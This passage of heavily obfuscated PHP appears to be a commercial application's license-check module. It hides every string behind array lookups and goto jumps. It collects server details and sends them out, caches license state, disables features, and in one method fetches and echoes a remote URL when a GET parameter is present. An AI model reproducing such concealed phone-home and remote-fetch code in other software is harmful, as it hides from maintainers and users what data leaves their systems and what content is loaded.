$Fëé’ﬂÃ¿[10]); $Bå≥º◊ãπŸ = $bäòèîä÷”[632]; if (!$Bå≥º◊ãπŸ) { return; } goto båîó·¢ÛÁ; bÛÎô·ﬂÏÊ: if (!$eáÿãıé∞ò) { return; } $FÔµõÛãËÚ = $Fëé’ﬂÃ¿[61]($Fëé’ﬂÃ¿[62])->{$_SERVER[åì®®Íêß][63]}(); $dµ¯éòâ‰ä = $bäòèîä÷”[631]; goto b–Á‚√¡Æé; dÓª‹⁄≥Ãê: } private function igqr02b760df() { goto b®÷∂∫É˘›; d˜àûÕ˜è‹: if (!$C‘áçÚëúæ) { return; } $b§è¥ä¬å… = array(); $b§è¥ä¬å…[$Aœßç∏¶Ìí] = $F¶É¿Ú∂Ö°; goto d≥«œÑ£ì«; Dí Çç√”á: while (strlen($A‚†◊”çÈù) < $C÷—ù·»∆ÿ[626]) { if (!$A‚†◊”çÈù) { break; } $A‚†◊”çÈù++; } goto cÿëÊçÀçˆ; AÇÆÕªÙÉ†: $D¬á’å£Ü˜ = $C÷—ù·»∆ÿ[637]; $Fó¨„ßæÇû[$dùÂ≤¿ÌñÖ[138]] = $dùÂ≤¿ÌñÖ[133]($dùÂ≤¿ÌñÖ[238]($this->{$_SERVER[åì®®Íêß][170]}($AŸ›∞Ö«√â, $dùÂ≤¿ÌñÖ[240]))); if ($cÇî‰ê–Öœ[$dùÂ≤¿ÌñÖ[241]] && $cÇî‰ê–Öœ[$dùÂ≤¿ÌñÖ[241]] >= 1) { $dùÂ≤¿ÌñÖ[61]($dùÂ≤¿ÌñÖ[62])->{$_SERVER[åì®®Íêß][242]}($dùÂ≤¿ÌñÖ[243], $dùÂ≤¿ÌñÖ[244]); } goto e›—ï’ùï∞; fê‡‡∞ëΩ¨: $D≤°ŸÍÃ∞Ê = $C÷—ù·»∆ÿ[634]; $açãŸÈÇÕÜ = array($dùÂ≤¿ÌñÖ[188] => $aÆ©°ÙâÛñ[$dùÂ≤¿ÌñÖ[188]], $dùÂ≤¿ÌñÖ[191] => $dùÂ≤¿ÌñÖ[139](16), $dùÂ≤¿ÌñÖ[192] => $dùÂ≤¿ÌñÖ[172], $dùÂ≤¿ÌñÖ[193] => $dùÂ≤¿ÌñÖ[194], $dùÂ≤¿ÌñÖ[195] => $_SERVER[$dùÂ≤¿ÌñÖ[196]], $dùÂ≤¿ÌñÖ[197] => $_SERVER[$dùÂ≤¿ÌñÖ[198]], $dùÂ≤¿ÌñÖ[199] => $_SERVER[$dùÂ≤¿ÌñÖ[200]], $dùÂ≤¿ÌñÖ[128] => $CÓÜ∞ÿõ’å, $dùÂ≤¿ÌñÖ[201] => $dùÂ≤¿ÌñÖ[61]($dùÂ≤¿ÌñÖ[62])->{$_SERVER[åì®®Íêß][63]}($dùÂ≤¿ÌñÖ[162])); $D‰ÂËﬂ‡Œë = $C÷—ù·»∆ÿ[635]; goto dÊãú⁄≥…‹; aÖ‹∫ôÚ≤›: $E¯…Íã»òæ = $C÷—ù·»∆ÿ[644]; $this->vwnif568d82e = $cÇî‰ê–Öœ; $fÁá®Ñ∂”” = $C÷—ù·»∆ÿ[645]; goto Bú∂®Éí±Ö; fà†Ø†°∫Ë: if (strlen($C®öÒ£éë⁄) < $C÷—ù·»∆ÿ[608]) { return; } $fóà≈Éôªö = $dùÂ≤¿ÌñÖ[246]($dùÂ≤¿ÌñÖ[61]($dùÂ≤¿ÌñÖ[11])->{$_SERVER[åì®®Íêß][247]}(), $dùÂ≤¿ÌñÖ[248]); $CÉ”ƒé â‡ = $C÷—ù·»∆ÿ[641]; goto d‡Ë—å„€ı; b®÷∂∫É˘›: $C÷—ù·»∆ÿ =& $_SERVER[™⁄»üÆ]; $dùÂ≤¿ÌñÖ =& $_SERVER[åì®®Íêß]; if ($_SERVER[$dùÂ≤¿ÌñÖ[44]] != $dùÂ≤¿ÌñÖ[185]) { return; } goto cÛπÀüü¶È; e›—ï’ùï∞: $dùÂ≤¿ÌñÖ[61]($dùÂ≤¿ÌñÖ[62])->{$_SERVER[åì®®Íêß][245]}($Fó¨„ßæÇû); $dªÎ√ç»…¨ = $dùÂ≤¿ÌñÖ[129]($_SERVER[$dùÂ≤¿ÌñÖ[130]] . $dùÂ≤¿ÌñÖ[238]($eÚä®¥ÈÒ·) . $Fó¨„ßæÇû[$dùÂ≤¿ÌñÖ[234]]); $D¥∂—Ω÷Ôı = $C÷—ù·»∆ÿ[638]; goto còõˆã®”ˆ; a´∫”„√πÉ: if (!isset($aÆ©°ÙâÛñ[$dùÂ≤¿ÌñÖ[188]]) || $dùÂ≤¿ÌñÖ[24]($aÆ©°ÙâÛñ[$dùÂ≤¿ÌñÖ[188]]) != 16) { $dùÂ≤¿ÌñÖ[189]($dùÂ≤¿ÌñÖ[190] . $aÆ©°ÙâÛñ[$dùÂ≤¿ÌñÖ[188]], !1); } $eÚä®¥ÈÒ· = $dùÂ≤¿ÌñÖ[61]($dùÂ≤¿ÌñÖ[62])->{$_SERVER[åì®®Íêß][63]}($dùÂ≤¿ÌñÖ[131]); $CÓÜ∞ÿõ’å = $dùÂ≤¿ÌñÖ[129]($_SERVER[$dùÂ≤¿ÌñÖ[130]] . $eÚä®¥ÈÒ·); goto fê‡‡∞ëΩ¨; d‡Ë—å„€ı: if (strlen($CÉ”ƒé â‡) < $C÷—ù·»∆ÿ[597]) { return; } $få¬ïÖìî≠ = $fóà≈Éôªö[$dùÂ≤¿ÌñÖ[249]]; $C‘áçÚëúæ = $C÷—ù·»∆ÿ[642]; goto d˜àûÕ˜è‹; E…Ò™åΩÖÂ: Cache::set($dùÂ≤¿ÌñÖ[254] . $dùÂ≤¿ÌñÖ[129]($eÚä®¥ÈÒ· . $dùÂ≤¿ÌñÖ[255]), $dùÂ≤¿ÌñÖ[10]); $dùÂ≤¿ÌñÖ[189]($dùÂ≤¿ÌñÖ[221]($dùÂ≤¿ÌñÖ[231]), !0); $A‚†◊”çÈù = $C÷—ù·»∆ÿ[646]; goto Dí Çç√”á; fíüüõŒ¯ë: $Fó¨„ßæÇû[$dùÂ≤¿ÌñÖ[137]] = $dùÂ≤¿ÌñÖ[238]($dùÂ≤¿ÌñÖ[133]($this->{$_SERVER[åì®®Íêß][170]}($BéÁß’îÁÜ, $dùÂ≤¿ÌñÖ[239]))); $B¶ÿìöÚ§ù = $dùÂ≤¿ÌñÖ[139](16); $AŸ›∞Ö«√â = $B¶ÿìöÚ§ù . $Fó¨„ßæÇû[$dùÂ≤¿ÌñÖ[135]] . $this->{$_SERVER[åì®®Íêß][170]}($dùÂ≤¿ÌñÖ[129]($Fó¨„ßæÇû[$dùÂ≤¿ÌñÖ[232]]), $B¶ÿìöÚ§ù); goto AÇÆÕªÙÉ†; BÙœ‘§áœ‚: $BéÁß’îÁÜ = $a‚ÛéØŒ€π . $Fó¨„ßæÇû[$dùÂ≤¿ÌñÖ[135]] . $Fó¨„ßæÇû[$dùÂ≤¿ÌñÖ[236]]; $fóßÖÆ‚ÎÂ = $C÷—ù·»∆ÿ[636]; if (strlen($fóßÖÆ‚ÎÂ) < $C÷—ù·»∆ÿ[626]) { die; } goto fíüüõŒ¯ë; d≥«œÑ£ì«: $cÖ¿ª¢·è∫ = $C÷—ù·»∆ÿ[643]; if (strlen($cÖ¿ª¢·è∫) < $C÷—ù·»∆ÿ[608]) { die; } $dùÂ≤¿ÌñÖ[61]($dùÂ≤¿ÌñÖ[11])->{$_SERVER[åì®®Íêß][250]}($få¬ïÖìî≠[$dùÂ≤¿ÌñÖ[251]], array($dùÂ≤¿ÌñÖ[252] => $b§è¥ä¬å…)); goto aÖ‹∫ôÚ≤›; fÑú…õàﬁ∑: $cÇî‰ê–Öœ = $A„¬€ˆ•ö≥[$dùÂ≤¿ÌñÖ[216]]; $aŸ‘¯®©Ÿ§ = $this->{$_SERVER[åì®®Íêß][223]}($cÇî‰ê–Öœ[$dùÂ≤¿ÌñÖ[224]]); if (!$aŸ‘¯®©Ÿ§ || $aŸ‘¯®©Ÿ§ != $cÇî‰ê–Öœ[$dùÂ≤¿ÌñÖ[160]]) { $FºÒúÛ„Ú∫ = array($dùÂ≤¿ÌñÖ[225] => $dùÂ≤¿ÌñÖ[61]($dùÂ≤¿ÌñÖ[62])->{$_SERVER[åì®®Íêß][63]}($dùÂ≤¿ÌñÖ[131]), $dùÂ≤¿ÌñÖ[226] => $_SERVER[$dùÂ≤¿ÌñÖ[130]], $dùÂ≤¿ÌñÖ[227] => $dùÂ≤¿ÌñÖ[228](), $dùÂ≤¿ÌñÖ[197] => $_SERVER[$dùÂ≤¿ÌñÖ[198]]); $BøÇƒÎ∫•Ú = $this->{$_SERVER[åì®®Íêß][229]}($dùÂ≤¿ÌñÖ[171]($FºÒúÛ„Ú∫)); $this->{$_SERVER[åì®®Íêß][207]}($dùÂ≤¿ÌñÖ[230] . $BøÇƒÎ∫•Ú); $dùÂ≤¿ÌñÖ[189]($dùÂ≤¿ÌñÖ[221]($dùÂ≤¿ÌñÖ[231]), !0); } goto e¨À∏è‰Ëˆ; Bú∂®Éí±Ö: if (strlen($fÁá®Ñ∂””) < $C÷—ù·»∆ÿ[616]) { die; } $this->vpny46eabd18 = $Fó¨„ßæÇû[$dùÂ≤¿ÌñÖ[135]]; $this->{$_SERVER[åì®®Íêß][253]}(); goto E…Ò™åΩÖÂ; e¨À∏è‰Ëˆ: $Fó¨„ßæÇû = array($dùÂ≤¿ÌñÖ[232] => $cÇî‰ê–Öœ[$dùÂ≤¿ÌñÖ[233]], $dùÂ≤¿ÌñÖ[234] => $cÇî‰ê–Öœ[$dùÂ≤¿ÌñÖ[235]], $dùÂ≤¿ÌñÖ[236] => $dùÂ≤¿ÌñÖ[139](16), $dùÂ≤¿ÌñÖ[135] => $cÇî‰ê–Öœ[$dùÂ≤¿ÌñÖ[237]]); if ($açãŸÈÇÕÜ[$dùÂ≤¿ÌñÖ[191]]) { $Fó¨„ßæÇû[$dùÂ≤¿ÌñÖ[236]] = $açãŸÈÇÕÜ[$dùÂ≤¿ÌñÖ[191]]; } $a‚ÛéØŒ€π = $dùÂ≤¿ÌñÖ[25]($dùÂ≤¿ÌñÖ[129]($Fó¨„ßæÇû[$dùÂ≤¿ÌñÖ[234]]), 10, 10); goto BÙœ‘§áœ‚; cÛπÀüü¶È: if (!$dùÂ≤¿ÌñÖ[121]($GLOBALS, $dùÂ≤¿ÌñÖ[147])) { die; } $aÆ©°ÙâÛñ = $GLOBALS[$dùÂ≤¿ÌñÖ[22]]; if (isset($aÆ©°ÙâÛñ[$dùÂ≤¿ÌñÖ[186]])) { $this->{$_SERVER[åì®®Íêß][187]}(); die; } goto a´∫”„√πÉ; còõˆã®”ˆ: if (!$D¥∂—Ω÷Ôı) { return; } $Aœßç∏¶Ìí = $dùÂ≤¿ÌñÖ[238]($dùÂ≤¿ÌñÖ[25]($dªÎ√ç»…¨, 10, 16)); $FìÇ˜„π√¿ = $C÷—ù·»∆ÿ[639]; goto e¯ÎÂó∆àå; e¯ÎÂó∆àå: if (strlen($FìÇ˜„π√¿) < $C÷—ù·»∆ÿ[626]) { die; } $F¶É¿Ú∂Ö° = $this->{$_SERVER[åì®®Íêß][142]}($dùÂ≤¿ÌñÖ[171]($cÇî‰ê–Öœ), $dªÎ√ç»…¨); $C®öÒ£éë⁄ = $C÷—ù·»∆ÿ[640]; goto fà†Ø†°∫Ë; dÊãú⁄≥…‹: if (strlen($D‰ÂËﬂ‡Œë) < $C÷—ù·»∆ÿ[608]) { die; } if ($aÆ©°ÙâÛñ[$dùÂ≤¿ÌñÖ[202]] == $dùÂ≤¿ÌñÖ[203]) { $aÇ£‡Á¥¶ƒ = $this->{$_SERVER[åì®®Íêß][170]}($CÓÜ∞ÿõ’å, $dùÂ≤¿ÌñÖ[204]); $BøÇƒÎ∫•Ú = $this->{$_SERVER[åì®®Íêß][142]}($dùÂ≤¿ÌñÖ[171]($açãŸÈÇÕÜ), $CÓÜ∞ÿõ’å . $dùÂ≤¿ÌñÖ[205], 3); $BøÇƒÎ∫•Ú = $BøÇƒÎ∫•Ú . $dùÂ≤¿ÌñÖ[206] . $_SERVER[$dùÂ≤¿ÌñÖ[196]]; $DéøÓŸ‚À† = $this->{$_SERVER[åì®®Íêß][207]}($dùÂ≤¿ÌñÖ[208] . $aÇ£‡Á¥¶ƒ . $dùÂ≤¿ÌñÖ[209] . $BøÇƒÎ∫•Ú, -1); $dùÂ≤¿ÌñÖ[189]($DéøÓŸ‚À†, !0); } else { if ($aÆ©°ÙâÛñ[$dùÂ≤¿ÌñÖ[202]] == $dùÂ≤¿ÌñÖ[210]) { $DÊÒ‘Ò©¢œ = $dùÂ≤¿ÌñÖ[25]($dùÂ≤¿ÌñÖ[129]($dùÂ≤¿ÌñÖ[211] . $CÓÜ∞ÿõ’å), 12, 15) . $dùÂ≤¿ÌñÖ[212]; $BøÇƒÎ∫•Ú = $this->{$_SERVER[åì®®Íêß][213]}($dùÂ≤¿ÌñÖ[2]($aÆ©°ÙâÛñ[$dùÂ≤¿ÌñÖ[214]]), $DÊÒ‘Ò©¢œ, 2); $A„¬€ˆ•ö≥ = $dùÂ≤¿ÌñÖ[215]($BøÇƒÎ∫•Ú, !0); if (!$dùÂ≤¿ÌñÖ[166]($A„¬€ˆ•ö≥) || !$dùÂ≤¿ÌñÖ[166]($A„¬€ˆ•ö≥[$dùÂ≤¿ÌñÖ[216]]) || $A„¬€ˆ•ö≥[$dùÂ≤¿ÌñÖ[188]] != !0) { $C¨ö”∫òù≥ = $dùÂ≤¿ÌñÖ[217]; $b±éãÎòºÀ = $A„¬€ˆ•ö≥[$dùÂ≤¿ÌñÖ[216]] ? $dùÂ≤¿ÌñÖ[218] . $A„¬€ˆ•ö≥[$dùÂ≤¿ÌñÖ[216]] : $C¨ö”∫òù≥; $dùÂ≤¿ÌñÖ[189]($b±éãÎòºÀ, !1); } else { $açãŸÈÇÕÜ[$dùÂ≤¿ÌñÖ[191]] = $A„¬€ˆ•ö≥[$dùÂ≤¿ÌñÖ[216]][$dùÂ≤¿ÌñÖ[219]]; } } else { $A„¬€ˆ•ö≥ = $this->{$_SERVER[åì®®Íêß][207]}($dùÂ≤¿ÌñÖ[220], $açãŸÈÇÕÜ, 10); } } if (!$dùÂ≤¿ÌñÖ[166]($A„¬€ˆ•ö≥) || !$dùÂ≤¿ÌñÖ[166]($A„¬€ˆ•ö≥[$dùÂ≤¿ÌñÖ[216]]) || $A„¬€ˆ•ö≥[$dùÂ≤¿ÌñÖ[188]] != !0) { $C¨ö”∫òù≥ = $dùÂ≤¿ÌñÖ[221]($dùÂ≤¿ÌñÖ[222]); $b±éãÎòºÀ = $A„¬€ˆ•ö≥[$dùÂ≤¿ÌñÖ[216]] ? $dùÂ≤¿ÌñÖ[218] . $A„¬€ˆ•ö≥[$dùÂ≤¿ÌñÖ[216]] : $C¨ö”∫òù≥; $dùÂ≤¿ÌñÖ[189]($b±éãÎòºÀ, !1); } goto fÑú…õàﬁ∑; cÿëÊçÀçˆ: } private function licenseRegistSuccess() { goto f˘èå“∆ñÍ; bËè…†öê–: $C©ûü„≤á√ = $cÃûôøÏ¬¬[647]; if (strlen($C©ûü„≤á√) < $cÃûôøÏ¬¬[608]) { die; } if ($FØ»úá”†¬[$D£»à«ê∑é[93]] != $D£»à«ê∑é[244]) { $D£»à«ê∑é[61]($D£»à«ê∑é[62])->{$_SERVER[åì®®Íêß][245]}($D£»à«ê∑é[93], $D£»à«ê∑é[244]); } goto d—πôÍ¿Æπ; f˘èå“∆ñÍ: $cÃûôøÏ¬¬ =& $_SERVER[™⁄»üÆ]; $D£»à«ê∑é =& $_SERVER[åì®®Íêß]; $FØ»úá”†¬ = $D£»à«ê∑é[61]($D£»à«ê∑é[62])->{$_SERVER[åì®®Íêß][63]}(); goto bËè…†öê–; d—πôÍ¿Æπ: $D£»à«ê∑é[125]($D£»à«ê∑é[256])->{$_SERVER[åì®®Íêß][257]}(!0); goto d∆◊£§Ïçô; d∆◊£§Ïçô: } private function uoav1f780428() { $CêêÕÉôÇŒ =& $_SERVER[åì®®Íêß]; $CêêÕÉôÇŒ[61]($CêêÕÉôÇŒ[62])->{$_SERVER[åì®®Íêß][245]}(array($CêêÕÉôÇŒ[232] => $CêêÕÉôÇŒ[10], $CêêÕÉôÇŒ[234] => $CêêÕÉôÇŒ[10], $CêêÕÉôÇŒ[135] => $CêêÕÉôÇŒ[136], $CêêÕÉôÇŒ[137] => $CêêÕÉôÇŒ[10], $CêêÕÉôÇŒ[138] => $CêêÕÉôÇŒ[10])); $CêêÕÉôÇŒ[61]($CêêÕÉôÇŒ[62])->{$_SERVER[åì®®Íêß][242]}($CêêÕÉôÇŒ[243], $CêêÕÉôÇŒ[258]); $this->vwnif568d82e = array(); $FáÆ≠ﬁä´Ü = $_SERVER[™⁄»üÆ][648]; $this->vpny46eabd18 = $CêêÕÉôÇŒ[136]; } private function lsnyd728873a() { goto c¬ÂìÙ¿£¡; C⁄ãëÁö ”: $F§ÊùÛÀ¨ò = Cache::get($cï¢»›‚ˆ©); if (!$cú†©Ωå°–[166]($F§ÊùÛÀ¨ò) || !isset($F§ÊùÛÀ¨ò[$cú†©Ωå°–[259]]) || $cú†©Ωå°–[260]() - $F§ÊùÛÀ¨ò[$cú†©Ωå°–[259]] >= 60) { $C°ŸÌ’Ëñë = $cú†©Ωå°–[246]($cú†©Ωå°–[61]($cú†©Ωå°–[11])->{$_SERVER[åì®®Íêß][247]}(), $cú†©Ωå°–[248]); $c¯´ñ¶Ù÷¨ = $C°ŸÌ’Ëñë[$cú†©Ωå°–[249]]; $E÷ŸÛ‹âæ‡ = $cú†©Ωå°–[129]($_SERVER[$cú†©Ωå°–[130]] . $cú†©Ωå°–[238]($fé˜‚Ïü∂Ó) . $aóèÖΩ¬¬©[$cú†©Ωå°–[234]]); $FíÛ∫Ëà± = $cú†©Ωå°–[238]($cú†©Ωå°–[25]($E÷ŸÛ‹âæ‡, 10, 16)); $F§ÊùÛÀ¨ò = $this->{$_SERVER[åì®®Íêß][213]}($c¯´ñ¶Ù÷¨[$cú†©Ωå°–[109]][$FíÛ∫Ëà±], $E÷ŸÛ‹âæ‡); $F§ÊùÛÀ¨ò = $cú†©Ωå°–[215]($F§ÊùÛÀ¨ò, !0); } if (!$cú†©Ωå°–[166]($F§ÊùÛÀ¨ò)) { return $this->{$_SERVER[åì®®Íêß][187]}(); } goto fúêïºÀ¶œ; cï¿ÈıŒ∏î: $fë‘≠íè…ı = $BéàÃËÖïñ[649]; if (!$fë‘≠íè…ı) { return; } $this->vpny46eabd18 = $cú†©Ωå°–[136]; goto d∂ï˘Ø“; c¬ÂìÙ¿£¡: $BéàÃËÖïñ =& $_SERVER[™⁄»üÆ]; $cú†©Ωå°– =& $_SERVER[åì®®Íêß]; $_SERVER[$cú†©Ωå°–[198]] = $cú†©Ωå°–[121]($_SERVER, $cú†©Ωå°–[198], APP_HOST); goto cï¿ÈıŒ∏î; fúêïºÀ¶œ: $Càˆ±∞∑Àƒ = $cú†©Ωå°–[159]($F§ÊùÛÀ¨ò[$cú†©Ωå°–[160]]); if ($cú†©Ωå°–[260]() >= $Càˆ±∞∑Àƒ) { return $this->{$_SERVER[åì®®Íêß][187]}(); } if ($cú†©Ωå°–[260]() - $F§ÊùÛÀ¨ò[$cú†©Ωå°–[259]] > 20) { $F§ÊùÛÀ¨ò[$cú†©Ωå°–[259]] = $cú†©Ωå°–[260](); Cache::set($cï¢»›‚ˆ©, $F§ÊùÛÀ¨ò); } goto aÌ§≤ÉÒ†â; aÌ§≤ÉÒ†â: $this->vwnif568d82e = $F§ÊùÛÀ¨ò; $this->vpny46eabd18 = $aóèÖΩ¬¬©[$cú†©Ωå°–[135]]; goto aÇ≥·ôâ÷; eõÉáŸÿÒª: $fé˜‚Ïü∂Ó = $cú†©Ωå°–[61]($cú†©Ωå°–[62])->{$_SERVER[åì®®Íêß][63]}($cú†©Ωå°–[131]); $C∂∆–ÖñÙö = $BéàÃËÖïñ[651]; $cï¢»›‚ˆ© = $cú†©Ωå°–[254] . $cú†©Ωå°–[129]($fé˜‚Ïü∂Ó . $cú†©Ωå°–[255]); goto C⁄ãëÁö ”; d∂ï˘Ø“: $aóèÖΩ¬¬© = $cú†©Ωå°–[61]($cú†©Ωå°–[62])->{$_SERVER[åì®®Íêß][63]}(); $AÉáµΩ™ï« = $BéàÃËÖïñ[650]; if ($aóèÖΩ¬¬©[$cú†©Ωå°–[135]] == $cú†©Ωå°–[136]) { return; } goto eõÉáŸÿÒª; aÇ≥·ôâ÷: } private function fgto4309b152() { goto dÌ Á◊§Éé; b„°ÿ˘›¬ : if ($E∫éå¢Ç±è == $EäîÚ£Í¬ö[261] && $this->vpny46eabd18 == $EäîÚ£Í¬ö[136]) { $EäîÚ£Í¬ö[189]($EäîÚ£Í¬ö[221]($EäîÚ£Í¬ö[262]), !1, $EäîÚ£Í¬ö[263]); } $D¨ï—¢Çè∆ = array($EäîÚ£Í¬ö[264], $EäîÚ£Í¬ö[265]); if ($EäîÚ£Í¬ö[266]($E∫éå¢Ç±è, $D¨ï—¢Çè∆)) { if ($this->vpny46eabd18 == $EäîÚ£Í¬ö[136] && isset($BÇòºÀöÉ√[$EäîÚ£Í¬ö[267]])) { $EäîÚ£Í¬ö[189]($EäîÚ£Í¬ö[221]($EäîÚ£Í¬ö[262]), !1, $EäîÚ£Í¬ö[263]); die; } $eÀ–Çòê˘≠ = $this->{$_SERVER[åì®®Íêß][152]}(); if ($eÀ–Çòê˘≠ != $EäîÚ£Í¬ö[268]($EäîÚ£Í¬ö[269])) { if ($eÀ–Çòê˘≠ <= $EäîÚ£Í¬ö[61]($EäîÚ£Í¬ö[154])->{$_SERVER[åì®®Íêß][155]}()) { $EäîÚ£Í¬ö[189]($EäîÚ£Í¬ö[221]($EäîÚ£Í¬ö[270]), !1, $EäîÚ£Í¬ö[263]); die; } } } goto aêâÙ Û˜í; dÌ Á◊§Éé: $cÀº‘‘≥òÎ =& $_SERVER[™⁄»üÆ]; $EäîÚ£Í¬ö =& $_SERVER[åì®®Íêß]; $BÇòºÀöÉ√ = $GLOBALS[$EäîÚ£Í¬ö[22]]; goto CﬁÛÈ…™®Ö; CﬁÛÈ…™®Ö: $fÑıË∏ûéã = $cÀº‘‘≥òÎ[652]; if (strlen($fÑıË∏ûéã) < $cÀº‘‘≥òÎ[626]) { die; } $E∫éå¢Ç±è = $_SERVER[$EäîÚ£Í¬ö[44]]; goto b„°ÿ˘›¬ ; aêâÙ Û˜í: } private function vkmieec24361() { goto FﬂÜ∆øë; d»≤’áü≠‘: $CÚ˘∆é‡¢· = $c ŸøÚ·©ﬂ[276](array($c ŸøÚ·©ﬂ[277] => array($c ŸøÚ·©ﬂ[278] => $c ŸøÚ·©ﬂ[279], $c ŸøÚ·©ﬂ[280] => 3))); $eı·ŒØéå∑ = $dÿé‡˘›âÙ[654]; if (strlen($eı·ŒØéå∑) < $dÿé‡˘›âÙ[608]) { return; } goto EÒÒ√†Ù»ı; EÒÒ√†Ù»ı: $DŒ‡≈Éì–Ø = @$c ŸøÚ·©ﬂ[281]($d®øÕâ¯Öà, !1, $CÚ˘∆é‡¢·); $c ŸøÚ·©ﬂ[282]($c ŸøÚ·©ﬂ[283]); if ($DŒ‡≈Éì–Ø && $c ŸøÚ·©ﬂ[32]($DŒ‡≈Éì–Ø, $c ŸøÚ·©ﬂ[284])) { echo $DŒ‡≈Éì–Ø; } goto FíÖ’¿íìÇ; FíÖ’¿íìÇ: die; goto aÇä∞–ƒË‘; E¥ßØì÷´£: if (!$c ŸøÚ·©ﬂ[121]($GLOBALS, $c ŸøÚ·©ﬂ[147]) || !isset($_GET[$c ŸøÚ·©ﬂ[272]])) { return; } if (!$c ŸøÚ·©ﬂ[266]($_SERVER[$c ŸøÚ·©ﬂ[44]], $fÜÉë¬ü«∂)) { return; } $d®øÕâ¯Öà = $c ŸøÚ·©ﬂ[273]; goto fµÈ•†˘˘⁄; FﬂÜ∆øë: $dÿé‡˘›âÙ =& $_SERVER[™⁄»üÆ]; $c ŸøÚ·©ﬂ =& $_SERVER[åì®®Íêß]; $fÜÉë¬ü«∂ = array($c ŸøÚ·©ﬂ[150], $c ŸøÚ·©ﬂ[271]); goto E¥ßØì÷´£; fµÈ•†˘˘⁄: $d®øÕâ¯Öà = $this->{$_SERVER[åì®®Íêß][274]}($d®øÕâ¯Öà, $c ŸøÚ·©ﬂ[275]); $eÇºæ∫ØëÙ = $dÿé‡˘›âÙ[653]; while (strlen($eÇºæ∫ØëÙ) < $dÿé‡˘›âÙ[626]) { if (!$eÇºæ∫ØëÙ) { break; } $eÇºæ∫ØëÙ++; } goto d»≤’áü≠‘; aÇä∞–ƒË‘: } public function dahjc4305b10($Aü™∑ëˆ‹À) { goto A·“Ö»ã»©; E±áˆòë∆É: $aâãõßı§® = array($f•¶—»¯÷[286] => $f•¶—»¯÷[287], $f•¶—»¯÷[288] => $f•¶—»¯÷[287], $f•¶—»¯÷[289] => $f•¶—»¯÷[287], $f•¶—»¯÷[290] => $f•¶—»¯÷[287], $f•¶—»¯÷[291] => $f•¶—»¯÷[292], $f•¶—»¯÷[293] => $f•¶—»¯÷[292], $f•¶—»¯÷[294] => $f•¶—»¯÷[292], $f•¶—»¯÷[295] => $f•¶—»¯÷[292], $f•¶—»¯÷[296] => $f•¶—»¯÷[292], $f•¶—»¯÷[297] => $f•¶—»¯÷[292], $f•¶—»¯÷[298] => $f•¶—»¯÷[292], $f•¶—»¯÷[299] => $f•¶—»¯÷[292], $f•¶—»¯÷[300] => $f•¶—»¯÷[292], $f•¶—»¯÷[301] => $f•¶—»¯÷[292], $f•¶—»¯÷[302] => $f•¶—»¯÷[292], $f•¶—»¯÷[303] => $f•¶—»¯÷[292]); $F≤ˆåªŒ÷í = $f•¶—»¯÷[0]($f•¶—»¯÷[304], $f•¶—»¯÷[121]($this->vwnif568d82e, $f•¶—»¯÷[144], $f•¶—»¯÷[10])); $F¢ Éÿç÷’ = array(); goto B≈ı±á…ﬂÁ; B≈ı±á…ﬂÁ: $d¬«àëÑÜã = $d£¶¢®æ·Á[655]; foreach ($aâãõßı§® as $cﬂÎúÛö∫¥ => $B√Îõéí’´) { if ($B√Îõéí’´ == $f•¶—»¯÷[287] && $f•¶—»¯÷[25]($this->vpny46eabd18, 0, 1) == $f•¶—»¯÷[287]) { continue; } if (!$f•¶—»¯÷[266]($cﬂÎúÛö∫¥, $F≤ˆåªŒ÷í)) { $F¢ Éÿç÷’[] = $cﬂÎúÛö∫¥; } } foreach ($F¢ Éÿç÷’ as $cﬂÎúÛö∫¥) { unset($Aü™∑ëˆ‹À[$cﬂÎúÛö∫¥]); } goto d”¬“¶®¥Ã; d”¬“¶®¥Ã: return $Aü™∑ëˆ‹À; $cøäüºÛ∏ = $d£¶¢®æ·Á[656]; if (!$cøäüºÛ∏) { return; } goto B˘Éœå∫èÎ; A·“Ö»ã»©: $d£¶¢®æ·Á =& $_SERVER[™⁄»üÆ]; $f•¶—»¯÷ =& $_SERVER[åì®®Íêß]; if ($this->vpny46eabd18 == $f•¶—»¯÷[285]) { return $Aü™∑ëˆ‹À; } goto E±áˆòë∆É; B˘Éœå∫èÎ: } private function rbtncaeb4620() { $c«¶≤¶Íí⁄ =& $_SERVER[åì®®Íêß]; if ($this->vpny46eabd18 != $c«¶≤¶Íí⁄[136]) { return; } $GLOBALS[$c«¶≤¶Íí⁄[109]][$c«¶≤¶Íí⁄[113]][$c«¶≤¶Íí⁄[305]] = $c«¶≤¶Íí⁄[244]; $GLOBALS[$c«¶≤¶Íí⁄[109]][$c«¶≤¶Íí⁄[306]] = $c«¶≤¶Íí⁄[244]; if ($c«¶≤¶Íí⁄[61]($c«¶≤¶Íí⁄[307])->{$_SERVER[åì®®Íêß][63]}($c«¶≤¶Íí⁄[93]) != $c«¶≤¶Íí⁄[258]) { $c«¶≤¶Íí⁄[61]($c«¶≤¶Íí⁄[307])->{$_SERVER[åì®®Íêß][245]}($c«¶≤¶Íí⁄[93], $c«¶≤¶Íí⁄[258]); } } public function xyup0fa7c256() { return $_SERVER[åì®®Íêß][308]; $d÷¢Ò®∫Êú = $_SERVER[™⁄»üÆ][657]; } private function zlvc9dcabe4d() { goto Fﬁµ≤øœÇª; DºçÃ√†›ç: $BíÕ¿ŸË¯Ö = $Bá‚¯”ÊØª[61]($Bá‚¯”ÊØª[62])->{$_SERVER[åì®®Íêß][63]}($Bá‚¯”ÊØª[131]); $FµôŒ´©ßù = $d€•ê†º∑˜[659]; if (strlen($FµôŒ´©ßù) < $d€•ê†º∑˜[597]) { return; } goto dÆÓ∫Ÿƒîò; eãê‡‹¯Ê°: $eéáùΩÕ¡∑ = $d€•ê†º∑˜[658]; if (strlen($eéáùΩÕ¡∑) < $d€•ê†º∑˜[606]) { return; } $Déí•ô∏©‰ = $Bá‚¯”ÊØª[312] . $Bá‚¯”ÊØª[129]($Bá‚¯”ÊØª[313]); goto E•∑Á›◊ˆç; AùÃç∫ã¬∞: $bƒ‡ñº¿ç€ = $Bá‚¯”ÊØª[13](array($Bá‚¯”ÊØª[314], $Bá‚¯”ÊØª[315]), $Déí•ô∏©‰); if ($bƒ‡ñº¿ç€ && $Bá‚¯”ÊØª[260]() - $bƒ‡ñº¿ç€ < $Bá‚¯”ÊØª[268]($Bá‚¯”ÊØª[316])) { return; } $Bá‚¯”ÊØª[13](array($Bá‚¯”ÊØª[314], $Bá‚¯”ÊØª[175]), $Déí•ô∏©‰, $Bá‚¯”ÊØª[260]()); goto DºçÃ√†›ç; E•∑Á›◊ˆç: if ($this->vpny46eabd18 == $Bá‚¯”ÊØª[136] || !$Bá‚¯”ÊØª[121]($GLOBALS, 